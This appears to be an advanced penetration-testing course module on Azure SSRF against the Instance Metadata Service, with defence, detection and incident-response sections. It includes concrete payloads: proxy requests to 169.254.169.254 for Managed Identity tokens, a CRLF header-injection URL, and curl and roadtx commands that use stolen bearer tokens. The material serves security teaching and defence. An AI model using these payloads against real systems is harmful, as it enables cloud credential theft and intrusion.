---
tags: [cloud, azure, ssrf, metadata, imds, token-theft]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.21 Azure SSRF"
---

# Azure SSRF via Instance Metadata Service (IMDS)

Server-Side Request Forgery (SSRF) in cloud environments is one of the most devastating web vulnerabilities, frequently leading to total environment compromise. In Microsoft Azure, the primary target for an SSRF attack on a virtual machine is the Azure Instance Metadata Service (IMDS). By manipulating a vulnerable application to query the IMDS, an attacker can extract sensitive configuration data and, critically, Managed Identity OAuth tokens, enabling lateral movement into the Azure control plane.

## 1. Architectural Deep Dive: Azure IMDS

The Azure IMDS is a REST endpoint accessible exclusively from within the virtual machine instance. It provides information about the instance's compute, network, and storage configuration, as well as an endpoint for acquiring identity tokens.

*   **IP Address**: `169.254.169.254` (non-routable, link-local IP)
*   **Protocol**: HTTP (Port 80)
*   **Required Header**: `Metadata: true`
*   **Required Parameter**: `api-version` (e.g., `api-version=2021-02-01`)

### The `Metadata: true` Mitigation

Unlike early versions of AWS (IMDSv1), which accepted simple GET requests, Azure designed IMDS with SSRF mitigation built-in. Every request to the Azure IMDS **must** include the HTTP header `Metadata: true`. 

If a vulnerable application only allows an attacker to control the URL (a simple SSRF), but does not allow the injection of custom HTTP headers, the IMDS will reject the request with a `400 Bad Request`. This makes exploiting SSRF in Azure significantly harder than in legacy AWS environments, but not impossible.

### ASCII Architecture Diagram

```text
+--------------------------------------------------------------------------+
|                        Azure Virtual Machine                             |
|                                                                          |
|  +--------------------------+                                            |
|  |   Vulnerable Web App     |                                            |
|  |                          | (1) Attacker sends crafted payload         |
|  | - PDF Generator          |<--- https://app.com/export?url=http://...  |
|  | - Webhook Processor      |                                            |
|  | - Proxy Endpoint         |                                            |
|  +-------------+------------+                                            |
|                |                                                         |
|                | (2) App forces GET request                              |
|                |     Target: 169.254.169.254                             |
|                |     Header injected: Metadata: true                     |
|                v                                                         |
|  +====================================================================+  |
|  |                   Azure Link-Local Router                          |  |
|  |                       (169.254.169.254)                            |  |
|  +====================================================================+  |
|                |                                                         |
|                v                                                         |
|  +--------------------------+                                            |
|  |       Azure IMDS         | (3) Validates Header & IP                  |
|  |  (Token Provider)        | (4) Returns JSON w/ Managed ID Token       |
|  +--------------------------+                                            |
+--------------------------------------------------------------------------+
                 |
                 | (5) Attacker receives token via SSRF response
                 v
        Attacker uses Token against management.azure.com
```

## 2. Exploitation Methodology

To successfully exploit IMDS, the attacker must find a way to include the `Metadata: true` header.

### 2.1 Direct Exploitation (Header Injection Allowed)

If the SSRF vulnerability exists in an API client or proxy that allows the attacker to specify custom HTTP headers alongside the URL, exploitation is trivial.

**Target Token Endpoint:**
`/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`

*Note: The `resource` parameter is crucial. It tells Azure Active Directory which service the token is intended for. `https://management.azure.com/` requests a token for the Azure Resource Manager (ARM) API, which is used to control infrastructure.*

**Attacker Request:**
```http
GET /proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Host: vulnerable-app.com
Custom-Header: Metadata: true
```

**Expected JSON Response:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGci...[REDACTED]...",
  "client_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "expires_in": "86399",
  "expires_on": "1694000000",
  "ext_expires_in": "86399",
  "not_before": "1693913300",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

### 2.2 Bypassing the Header Requirement

If the application does *not* allow custom headers, attackers must use advanced SSRF techniques to trick the application into appending the header or parsing the request maliciously.

1.  **CRLF Injection (HTTP Request Smuggling)**: If the application uses a vulnerable HTTP library that does not sanitize carriage returns (`\r`) and line feeds (`\n`) in the URL, the attacker can inject the header directly into the URL payload.
    *   `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ HTTP/1.1%0D%0AMetadata: true%0D%0A`
2.  **DNS Rebinding**: In complex scenarios, an attacker might use DNS rebinding to bypass initial validation (e.g., an application checking if an IP is internal), though the `Metadata: true` requirement still stands unless combined with a caching or parsing flaw.
3.  **Exploiting Specific Libraries**: Some PDF generation libraries (like older versions of `wkhtmltopdf`) might append certain headers by default, or allow header injection via specific HTML tags.

### 2.3 Using the Stolen Token

Once the Bearer token is acquired, the attacker pivots to the Azure CLI (`az`) or raw REST API calls. 

First, validate the token using the `jwt.io` decoder or locally, to see the `oid` (Object ID) and `tid` (Tenant ID).
Then, authenticate to the Azure REST API to enumerate the permissions of the Managed Identity.

**Enumerating Subscriptions:**
```bash
curl -X GET -H "Authorization: Bearer eyJ0..." \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**Enumerating Resource Groups (Once a subscription ID is found):**
```bash
curl -X GET -H "Authorization: Bearer eyJ0..." \
  "https://management.azure.com/subscriptions/[SUB_ID]/resourcegroups?api-version=2020-06-01"
```

If the Managed Identity has `Contributor` or `Owner` rights, the attacker can execute commands on other VMs via the `runCommand` API, extract secrets from Key Vaults, or exfiltrate databases.

### 2.4 Token Scopes (`resource` parameter)

The attacker is not limited to requesting tokens for the Azure Resource Manager. Depending on what the Managed Identity is authorized to access, the attacker can change the `resource` parameter in the IMDS query to get tokens for other services:

*   **Microsoft Graph API**: `resource=https://graph.microsoft.com/` (For querying Azure AD users, groups, and applications).
*   **Azure Key Vault**: `resource=https://vault.azure.net` (For accessing secrets directly without ARM).
*   **Azure Storage**: `resource=https://storage.azure.com/` (For accessing Blob storage).

## 3. Defense and Remediation

Mitigating IMDS SSRF attacks involves defense-in-depth strategies spanning application code, network configuration, and IAM.

1.  **Strict Input Validation**: At the application layer, completely sanitize and validate all user input used to construct URLs. Implement allow-lists for permitted domains. Never allow the application to route requests to local subnets (`169.254.0.0/16`, `127.0.0.0/8`, `10.0.0.0/8`).
2.  **Network Level Blocking (The strongest defense)**: Use the host firewall (iptables on Linux, Windows Defender Firewall) to block outbound connections from the web application's user process to `169.254.169.254`. Only allow specific, required agent processes (like the Azure Monitor Agent) to reach the IMDS IP.
    *   *Linux Example*: `iptables -A OUTPUT -d 169.254.169.254 -m owner ! --uid-owner root -j DROP`
3.  **Principle of Least Privilege (PoLP) for Managed Identities**: A Managed Identity should never have sweeping roles like `Contributor` on the entire Subscription. Grant it access only to the specific resources it needs (e.g., Reader on a single Key Vault secret).
4.  **Use IMDSv2 Concepts (Where applicable)**: While Azure's `Metadata: true` is their version of mitigation, always ensure you are using the latest `api-version` which may contain stricter routing enforcements.

## 4. Forensics and Detection

*   **Network Flow Logs / NSG Flow Logs**: While you cannot easily log traffic to `169.254.169.254` via standard Azure Network Security Groups (because it's link-local traffic that doesn't hit the virtual switch the same way), host-based monitoring (like Sysmon or EDR) can detect processes communicating with the IMDS IP.
*   **Azure Activity Logs**: Look for anomalous API calls made by a Managed Identity. If a VM's Managed Identity typically only reads from a specific Storage Account, but suddenly starts querying the `Microsoft.Authorization/roleAssignments` API, the token has been hijacked.
*   **Token Origin anomalies**: Azure Identity Protection can flag if a token issued to a Managed Identity (which should only be used from Azure datacenter IPs) is suddenly used to authenticate from a residential ISP or a known VPN node (Token Exfiltration).

## Chaining Opportunities

*   **[[18 - Azure AD — Misconfiguration, Privilege Escalation]]**: Requesting a token for Microsoft Graph (`resource=https://graph.microsoft.com`) to execute Azure AD privilege escalation attacks.
*   **[[01 - SSRF (Server-Side Request Forgery)]]**: The foundational application vulnerability required to initiate this attack.
*   **[[22 - Cloud Key Vault Abuses]]**: Using the stolen token to dump the organization's Key Vaults.

## Related Notes

*   [[15 - GCP Metadata Server — Credential Theft]] - The exact same conceptual attack applied to Google Cloud.
*   [[08 - AWS IMDSv1 vs IMDSv2]] - How Amazon mitigates this attack compared to Azure.

## Appendix D: Comprehensive Cloud Penetration Testing Methodology
When assessing cloud environments for default service account abuse and privilege escalation, standard network penetration testing methodologies fall short. The focus must shift to identity, metadata, and control plane interactions.

### Step 1: Reconnaissance & OSINT
*   Identify cloud provider footprint via ASN mapping and DNS enumeration.
*   Enumerate public storage buckets and exposed serverless functions.
*   Scrape GitHub and GitLab for accidentally committed service account keys or infrastructure-as-code (IaC) templates.

### Step 2: Initial Access & Foothold
*   Exploit traditional web vulnerabilities (SSRF, RCE, LFI) on exposed compute instances.
*   Phish internal developers for overly permissive tokens or CLI credentials.
*   Utilize compromised CI/CD pipelines as an entry point into the cloud fabric.

### Step 3: Local Enumeration & Metadata Extraction
*   Query the link-local metadata servers (`169.254.169.254`).
*   Extract instance identity tokens, project metadata, and user-data/startup scripts.
*   Analyze the local environment variables and hidden files (`.aws/credentials`, `gcloud/application_default_credentials.json`).

### Step 4: Lateral Movement & Privilege Escalation
*   Leverage stolen tokens to authenticate to the cloud provider's API.
*   Enumerate attached IAM policies, roles, and scopes.
*   Exploit misconfigurations (e.g., `iam.serviceAccounts.actAs` or missing scope limits) to jump to higher-privileged accounts or resources.

## Appendix E: Incident Response and Forensics Playbook
When a breach is suspected, responders must act quickly to contain the blast radius.

### Containment
1.  **Revoke Tokens**: Immediately revoke the stolen access tokens.
2.  **Isolate the Instance**: Detach the compromised VM from the VPC network or apply a strict deny-all firewall rule, preserving the disk state for forensic imaging.
3.  **Rotate Keys**: Rotate any static access keys or secrets that were accessible from the compromised instance's environment.

### Investigation
1.  **Audit Logs**: Query Cloud Audit Logs for anomalous API calls originating from the compromised service account's token. Look for actions outside its normal baseline.
2.  **Network Flow**: Analyze VPC Flow Logs for unexpected outbound connections, particularly to known threat actor infrastructure or large data transfers indicating exfiltration.
3.  **Disk Forensics**: Image the instance's boot disk and analyze for dropped malware, modified startup scripts, or signs of lateral movement tooling.

## Appendix A: Exploiting the Windows Azure Guest Agent

In some legacy or highly specific Windows VM configurations, an attacker with Local Administrator or SYSTEM privileges might exploit the Azure Guest Agent (`WaAppAgent.exe`) or the wire server (`168.63.129.16`). While not strictly an SSRF from a web application perspective, it is an adjacent vector for interacting with the Azure fabric. The wire server provides communication between the VM and the Azure Host platform, facilitating extensions and heartbeat monitoring.

## Appendix B: Token Replay and Exfiltration Tools

### The `roadtx` Toolkit
Once an attacker extracts the Managed Identity token via SSRF, they frequently use the `roadtx` tool (from the ROADtools suite) to replay the token and interact with the Azure APIs securely from their local machine.
```bash
# Using an extracted token to query the Graph API
roadtx graph -t "eyJ0eXAi..." -r "https://graph.microsoft.com/" --get "/v1.0/users"
```

### Automation Scripts for SSRF
Security researchers have developed automated scripts that, upon identifying a blind SSRF, will systematically attempt to inject the `Metadata: true` header and brute-force the necessary `api-version` parameters to extract the token. Tools like `Gopherus` (adapted for cloud) or custom Python scripts are commonly used to automate the extraction and validation of the Managed Identity token.

## Appendix C: Implementing Defense-in-Depth

1.  **IMDSv2 Equivalents**: While Azure does not have a strict "IMDSv2" feature toggle like AWS, Microsoft continuously updates the `api-version` requirements. Always ensure VMs are using the most current, supported configurations and that legacy fallback APIs are restricted if possible via network controls.
2.  **Application Layer Firewalls (WAF)**: A properly configured Web Application Firewall (like Azure Front Door or Application Gateway) can detect and block incoming HTTP requests containing payloads that attempt to exploit known SSRF vulnerabilities, providing a critical layer of defense before the request even reaches the vulnerable application logic.
